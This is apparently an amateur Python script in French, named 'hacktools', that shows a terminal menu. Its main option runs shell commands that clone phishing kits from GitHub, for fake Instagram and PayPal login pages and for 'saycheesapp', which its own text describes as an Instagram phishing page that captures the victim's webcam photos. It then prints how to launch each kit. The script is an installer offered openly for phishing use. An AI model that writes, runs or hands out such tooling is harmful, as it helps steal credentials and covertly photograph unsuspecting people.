#coding:utf-8

"""
	Cette aplication fonctionne sur Linux MacOS(X) ...
	Le code est en Python et non pas en bash(shell) pour l'executer vous devririés taper la commande suivante :
	python3 hacktools
	ATTANTION :
		Le code ne fonctionne pas sous windows car les comamde du terminal ne son pas les même
		Merci de votre compréhention en cas de probleme contacter moi à l'adresse mail suivante :
		juliedbac@gmail.com
"""
#------------------------------------#
#             VARIABLE               #
#------------------------------------#
username = "--"
on_off = True
#
#------------------------------------#

#------------------------------------#
#               MODULE               #
#------------------------------------#
import os
from time import sleep
#
#------------------------------------#

def println(number):
	k = 0
	while k < number :
		print("")
		k += 1

def printError():
	print("Désolé votre saisie est incorecte \n choisiser une option valide :")
	println(4)

#------------------------------------#


while on_off:
#------------------------------------#
#           choix de nom             #
#------------------------------------#
	if username == "--":
		userNameChoise = input("[*]vouler-vous choisir un nom d'utilisateur ?\n[1]OUI\n[2]NON\n{}>".format(username))
		userNameChoise = str(userNameChoise)#									cast des valeur sasi dans le but de limité les erreur


		if userNameChoise=="1":
			username = input("Entrée votre nom d'utilisateur \n{}>".format(username))
			username = str(username)#											cast des valeur sasi dans le but de limité les erreur

		elif userNameChoise=="2":
			username = ">>"

		else :
			printError()
#																				choix dune option entre instalation / utilisation / chager de nom / ou sortie de hacktools
	else:
		os.system("clear")
		print("[*]Choisir une option :\n\n[1]installation des outils \n[2] \n[3]Changer de nom \n[4]sortie")
		userChoise = input("{}>".format(username))
		userChoise = str(userChoise)#											choix d'une option instalation 
		if userChoise == "1":#													menu userchoice
			os.system("clear")#													netoyage du terminal
			print("[*]Choisir une option :\n\n[1]installé les outils de phishing\n[2]installé Saycheesapp \n[3] \n[4]sortie")
			userChoise_tools = input("{}>".format(username))
			userChoise_tools = str(userChoise_tools)#							cast des valeur sasi dans le but de limité les erreur
			if userChoise_tools == "1":#										choix n°1 pour istaller les outils de phishing
				os.system("mkdir tools")
				os.system("git clone https://github.com/thelinuxproject/instagram tools/instagram")#	installation de instapump
				os.system("git clone https://github.com/thelinuxproject/paypal tools/paypal")#	installation de paypal
				os.system("clear")
				println(7)
				print("operation terminer...\n	Commandes pour utiliser instagram :\n •cd tools/insatgram\n•bash instagram.sh")
				print("\n	Commandes pour utiliser paypal :\n •cd tools/paypal\n•bash paypal.sh")
				sleep(6)#														attente de 4seconde	
			elif userChoise_tools == "2":#										choix n°1 pour istaller les outils de phishing
				os.system("mkdir tools")
				os.system("git clone https://github.com/thelinuxproject/saycheesapp tools/saycheesapp")#	installation de saycheesapp 
				os.system("clear")
				println(7)
				print("operation terminer...\nsaycheesapp est une version phishing de instagrm (avec des photo de la webcam de votre victim)\n	Commandes pour l'utiliser :\n •cd tools/saycheesapp\n•bash saycheesapp.sh")
				sleep(6)#
			elif userChoise_tools == "4":#										choix n°4 pour quitter le choi de téléchargement des des depots
				userChoise = "0"#												retour au menu userchoice
			else :
					os.system("clear")
					printError()

		elif userChoise == "2":
			os.system("clear")
			print("[*]Choisir une option :\n\n[1]\n[2] \n[3] \n[4]sortie")
			userChoise_ph = input("{}>".format(username))
			userChoise_ph = str(userChoise_ph)#									cast de la variable userChoise_ph
			#if userChoise_ph == "1":
			if userChoise_ph == "4":#											choix n°4 pour quitter le chois de l'outis
				userChoise = "0"#												retour au menu userchoice
			else :
				os.system("clear")#												netoyer le terminal
				printError()

		elif userChoise == "3":
			username = "--"#													retour au menu changer de nom
		elif userChoise == "4":
			on_off = 0#															sorti de hacktools
		else :
			os.system("clear")#													netoyer le terminal
			printError()
